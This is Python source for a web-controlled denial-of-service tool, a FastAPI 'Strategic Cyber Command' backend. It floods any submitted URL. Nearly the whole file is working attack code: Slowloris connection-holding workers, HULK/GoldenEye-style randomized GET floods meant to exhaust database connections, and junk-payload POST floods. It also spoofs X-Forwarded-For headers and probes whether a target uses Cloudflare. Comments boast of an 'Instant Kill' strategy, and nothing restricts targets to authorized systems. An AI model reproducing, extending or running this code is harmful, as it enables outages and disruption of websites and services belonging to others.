import asyncio
import aiohttp
import sqlite3
import time
import random
import logging
import psutil
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Optional
from datetime import datetime
import uvicorn
import json
import socket
import os
import string

# --- Configuration ---
DB_NAME = "cyber_operations.db"
VPS_IP = "76.13.179.65"

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("CyberBackend")

# --- Database Initialization ---
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_url TEXT NOT NULL,
            mode TEXT DEFAULT 'standard',
            concurrency INTEGER,
            duration INTEGER,
            start_time TIMESTAMP,
            end_time TIMESTAMP,
            status TEXT DEFAULT 'Running',
            total_requests INTEGER DEFAULT 0,
            success_count INTEGER DEFAULT 0,
            fail_count INTEGER DEFAULT 0,
            avg_rps REAL DEFAULT 0.0,
            bytes_received INTEGER DEFAULT 0
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS telemetry (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id INTEGER,
            timestamp TIMESTAMP,
            requests INTEGER,
            success INTEGER,
            failed INTEGER,
            rps REAL,
            latency_avg REAL,
            FOREIGN KEY(campaign_id) REFERENCES campaigns(id)
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# --- FastAPI App ---
app = FastAPI(title="Strategic Cyber Command API", version="5.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Global State ---
active_campaign = None
telemetry_subscribers: List[WebSocket] = []
log_subscribers: List[WebSocket] = []
inspector_subscribers: List[WebSocket] = []

# --- Models ---
class CampaignRequest(BaseModel):
    target_url: str
    mode: str = "standard"
    concurrency: int
    duration: int

class CampaignResponse(BaseModel):
    id: int
    status: str
    start_time: str

class VerifyRequest(BaseModel):
    target_url: str

# --- WebSocket Helper ---
async def broadcast_log(message: str, type: str = "info"):
    payload = json.dumps({
        "type": "log",
        "data": {
            "timestamp": datetime.now().strftime('%H:%M:%S'),
            "message": message,
            "level": type
        }
    })
    for ws in log_subscribers:
        try:
            await ws.send_text(payload)
        except:
            pass

async def broadcast_inspector(url: str, status: int, headers: dict, latency: float):
    payload = json.dumps({
        "type": "inspector",
        "data": {
            "timestamp": datetime.now().strftime('%H:%M:%S.%f')[:-3],
            "url": url,
            "status": status,
            "headers": headers,
            "latency": f"{latency:.2f}ms"
        }
    })
    for ws in inspector_subscribers:
        try:
            await ws.send_text(payload)
        except:
            pass

# --- Attack Engine (Integrated) ---
class AttackEngine:
    def __init__(self, campaign_id, target, mode, concurrency, duration):
        self.campaign_id = campaign_id
        self.target = target
        self.mode = mode
        self.concurrency = concurrency
        self.duration = duration
        self.is_running = False
        self.stats = {"requests": 0, "success": 0, "failed": 0, "bytes": 0}
        self.start_time = 0
        self.last_inspector_time = 0

    async def slowloris_worker(self, end_time):
        """
        Slowloris implementation: Holds connections open with partial headers.
        Effective against threaded servers (Apache, etc.) to exhaust worker pool.
        """
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
        ]
        
        while time.time() < end_time and self.is_running:
            try:
                # Parse Target
                from urllib.parse import urlparse
                parsed = urlparse(self.target)
                host = parsed.hostname
                port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
                ssl_ctx = True if parsed.scheme == "https" else False
                
                reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx)
                
                # Send Partial Request
                writer.write(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                writer.write(f"Host: {host}\r\n".encode("utf-8"))
                writer.write(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
                writer.write(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                await writer.drain()
                
                self.stats["requests"] += 1 # Count connection as a request
                self.stats["success"] += 1
                
                # Keep-Alive Loop
                while self.is_running and time.time() < end_time:
                    await asyncio.sleep(10) # Wait 10s between headers
                    writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    await writer.drain()
                    
            except Exception as e:
                self.stats["failed"] += 1
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
                await asyncio.sleep(1)

    async def worker(self, session, end_time, worker_id):
        # Base headers
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        ]
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "DNT": "1"
        }
        
        # Mode Specific Setup
        payload = None
        if self.mode == "heavy":
            payload = os.urandom(1024) # 1KB Junk
            headers["Content-Type"] = "application/octet-stream"
        elif self.mode == "research":
            # GitHub Research: GoldenEye/HULK style randomization
            headers["Referer"] = random.choice(["https://google.com", "https://bing.com", "https://yahoo.com"])
            headers["Accept-Language"] = random.choice(["en-US,en;q=0.9", "es-ES,es;q=0.9", "zh-CN,zh;q=0.9"])
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        while time.time() < end_time and self.is_running:
            try:
                # URL Randomization (Cache Busters)
                url = f"{self.target}"
                separator = "&" if "?" in url else "?"
                
                if self.mode == "research":
                    # Research Mode: Focus on Heavy DB Queries (Search)
                    # Use common query parameters that trigger database lookups
                    search_params = ["s", "search", "q", "query", "keyword", "file", "id"]
                    param_name = random.choice(search_params)
                    param_val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
                    url += f"{separator}{param_name}={param_val}"
                else:
                    # Simple Randomization
                    url += f"{separator}t={random.randint(100000, 999999)}"
                
                start_req = time.time()
                
                if self.mode == "heavy":
                    # POST Request (Heavy)
                    async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                        await response.read()
                        latency = (time.time() - start_req) * 1000
                        await self.process_response(response, latency, url)
                elif self.mode == "research":
                    # Research Mode: High Volume GETs to exhaust DB connections
                    # We dropped the POST/Slowloris mix here to focus on pure RPS for DB exhaustion
                    async with session.get(url, headers=headers, timeout=5) as response:
                        await response.read()
                        latency = (time.time() - start_req) * 1000
                        await self.process_response(response, latency, url)
                else:
                    # Standard GET
                    async with session.get(url, headers=headers, timeout=5) as response:
                        await response.read()
                        latency = (time.time() - start_req) * 1000
                        await self.process_response(response, latency, url)
                            
            except aiohttp.ClientError as e:
                self.stats["requests"] += 1
                self.stats["failed"] += 1
                if self.stats["failed"] % 100 == 0:
                     await broadcast_log(f"Connection Error: {str(e)}", "error")
            except Exception as e:
                self.stats["requests"] += 1
                self.stats["failed"] += 1

    async def process_response(self, response, latency, url):
        self.stats["requests"] += 1
        self.stats["bytes"] += response.content_length or 0
        
        if response.status < 400:
            self.stats["success"] += 1
        else:
            self.stats["failed"] += 1
            if self.stats["failed"] % 100 == 0:
                await broadcast_log(f"Target responded with HTTP {response.status}", "warning")

        # Live Inspector
        now = time.time()
        if now - self.last_inspector_time > 0.5:
            self.last_inspector_time = now
            server_headers = {k: v for k, v in response.headers.items() if k.lower() in ['server', 'date', 'content-type', 'set-cookie', 'x-powered-by', 'cf-ray']}
            await broadcast_inspector(url, response.status, server_headers, latency)

    async def run(self):
        self.is_running = True
        self.start_time = time.time()
        end_time = self.start_time + self.duration
        
        mode_map = {
            "standard": "Standard Flood (GET)",
            "heavy": "INFRASTRUCTURE STRESS (POST)",
            "research": "GITHUB RESEARCH (HULK/GoldenEye)"
        }
        mode_str = mode_map.get(self.mode, "Unknown")
        
        try:
            await broadcast_log(f"Initializing {self.concurrency} workers in {mode_str} mode...", "info")
            
            connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
            timeout = aiohttp.ClientTimeout(total=5, connect=2) # Tuned for Aggressive Speed
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                try:
                    await broadcast_log(f"Verifying connectivity to {self.target}...", "info")
                    async with session.get(self.target, timeout=3) as resp:
                        await broadcast_log(f"Target is REACHABLE. Status: {resp.status}", "success")
                except Exception as e:
                    await broadcast_log(f"WARNING: Target check failed: {str(e)}", "warning")
                
                workers = []
                if self.mode == "research":
                    # Strategy: 95% DB Buster (HULK GETs), 5% Slowloris - Optimized for "Instant Kill"
                    slow_count = max(1, int(self.concurrency * 0.05))
                    fast_count = self.concurrency - slow_count
                    
                    await broadcast_log(f"Strategy: INSTANT DEMO ({fast_count} HULK + {slow_count} Slowloris)", "info")
                    
                    # Launch Slowloris Workers
                    for _ in range(slow_count):
                        workers.append(asyncio.create_task(self.slowloris_worker(end_time)))
                    
                    # Launch HULK/GoldenEye Workers
                    for i in range(fast_count):
                        workers.append(asyncio.create_task(self.worker(session, end_time, i)))
                else:
                    # Standard / Heavy Mode
                    workers = [asyncio.create_task(self.worker(session, end_time, i)) for i in range(self.concurrency)]
                
                await broadcast_log("Attack Phase STARTED.", "success")
                
                while self.is_running and time.time() < end_time:
                    await self.broadcast_telemetry()
                    await asyncio.sleep(1)
                
                self.is_running = False
                for w in workers:
                    w.cancel()
                
                await asyncio.gather(*workers, return_exceptions=True)
                
            self.update_db_status("Completed")
            await self.broadcast_telemetry()
            await broadcast_log("Operation Completed.", "info")
        except Exception as e:
            await broadcast_log(f"CRITICAL ERROR in Engine: {str(e)}", "error")
            self.is_running = False

    async def broadcast_telemetry(self):
        elapsed = time.time() - self.start_time
        rps = self.stats["requests"] / elapsed if elapsed > 0 else 0
        
        telemetry = {
            "campaign_id": self.campaign_id,
            "timestamp": datetime.now().isoformat(),
            "requests": self.stats["requests"],
            "success": self.stats["success"],
            "failed": self.stats["failed"],
            "rps": round(rps, 2),
            "bytes": self.stats["bytes"]
        }
        
        try:
            conn = sqlite3.connect(DB_NAME)
            conn.execute('''
                INSERT INTO telemetry (campaign_id, timestamp, requests, success, failed, rps, latency_avg)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (self.campaign_id, datetime.now(), self.stats["requests"], self.stats["success"], self.stats["failed"], rps, 0))
            conn.commit()
            conn.close()
        except:
            pass
        
        message = json.dumps({"type": "telemetry", "data": telemetry})
        for ws in telemetry_subscribers:
            try:
                await ws.send_text(message)
            except:
                pass

    def update_db_status(self, status):
        try:
            conn = sqlite3.connect(DB_NAME)
            conn.execute("UPDATE campaigns SET status=?, end_time=? WHERE id=?", (status, datetime.now(), self.campaign_id))
            conn.commit()
            conn.close()
        except:
            pass

    def stop(self):
        self.is_running = False
        self.update_db_status("Aborted")

# --- API Endpoints ---

@app.post("/api/verify")
async def verify_target(req: VerifyRequest):
    target = req.target_url
    if not target.startswith("http"):
        target = "http://" + target
        
    try:
        # WHOIS / GeoIP Lookup Logic
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname
        
        try:
            ip = socket.gethostbyname(host)
        except:
            ip = host
            
        # Basic GeoIP (Simulated for speed, in production use MaxMind/IPInfo)
        # Check if Cloudflare
        is_cloudflare = False
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}", timeout=5) as resp:
                    geo_data = await resp.json()
                    org = geo_data.get("org", "")
                    if "Cloudflare" in org or "Cloudflare" in geo_data.get("isp", ""):
                        is_cloudflare = True
        except:
            geo_data = {"country": "Unknown", "isp": "Unknown", "org": "Unknown"}

        async with aiohttp.ClientSession() as session:
            start = time.time()
            async with session.get(target, timeout=5) as resp:
                latency = (time.time() - start) * 1000
                return {
                    "status": "online",
                    "code": resp.status,
                    "latency": round(latency, 2),
                    "headers": dict(resp.headers),
                    "ip": ip,
                    "geo": geo_data,
                    "is_cloudflare": is_cloudflare
                }
    except Exception as e:
        return {"status": "offline", "error": str(e)}

@app.post("/api/campaigns/start", response_model=CampaignResponse)
async def start_campaign(campaign: CampaignRequest):
    global active_campaign
    if active_campaign and active_campaign.is_running:
        await broadcast_log(f"Stopping previous campaign...", "warning")
        active_campaign.stop()
        await asyncio.sleep(0.5) 
    
    target = campaign.target_url
    if not target.startswith("http"):
        target = "http://" + target
        
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        INSERT INTO campaigns (target_url, mode, concurrency, duration, start_time, status)
        VALUES (?, ?, ?, ?, ?, 'Running')
    ''', (target, campaign.mode, campaign.concurrency, campaign.duration, datetime.now()))
    campaign_id = c.lastrowid
    conn.commit()
    conn.close()
    
    active_campaign = AttackEngine(
        campaign_id, 
        target, 
        campaign.mode,
        campaign.concurrency, 
        campaign.duration
    )
    asyncio.create_task(active_campaign.run())
    
    return {
        "id": campaign_id,
        "status": "Running",
        "start_time": datetime.now().isoformat()
    }

@app.post("/api/campaigns/stop")
async def stop_campaign():
    global active_campaign
    if active_campaign and active_campaign.is_running:
        active_campaign.stop()
        await broadcast_log("User requested STOP.", "warning")
        return {"status": "Stopped"}
    raise HTTPException(status_code=404, detail="No active campaign")

@app.post("/api/system/reset")
async def reset_system():
    global active_campaign
    if active_campaign and active_campaign.is_running:
        active_campaign.stop()
    await broadcast_log("System Reset Initiated.", "info")
    return {"status": "Reset"}

@app.get("/api/system/health")
async def system_health():
    return {
        "cpu": psutil.cpu_percent(),
        "ram": psutil.virtual_memory().percent,
        "active_connections": len(telemetry_subscribers),
        "node_ip": VPS_IP
    }

@app.websocket("/ws/telemetry")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    telemetry_subscribers.append(websocket)
    log_subscribers.append(websocket)
    inspector_subscribers.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        telemetry_subscribers.remove(websocket)
        log_subscribers.remove(websocket)
        inspector_subscribers.remove(websocket)

# --- Static Files (Frontend) ---
# Try to find frontend directory relative to this file or root
frontend_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "frontend")
if os.path.exists(frontend_path):
    app.mount("/", StaticFiles(directory=frontend_path, html=True), name="frontend")
else:
    # Fallback if running from root
    if os.path.exists("frontend"):
        app.mount("/", StaticFiles(directory="frontend", html=True), name="frontend")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
